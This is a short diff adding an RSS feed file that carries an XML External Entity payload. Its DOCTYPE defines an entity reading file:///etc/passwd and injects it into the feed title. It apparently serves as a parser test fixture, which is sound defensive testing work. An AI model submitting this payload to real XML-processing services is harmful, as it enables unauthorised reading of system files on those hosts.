@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
+<rss version="2.0"><channel><title>&secret;</title></channel></rss>
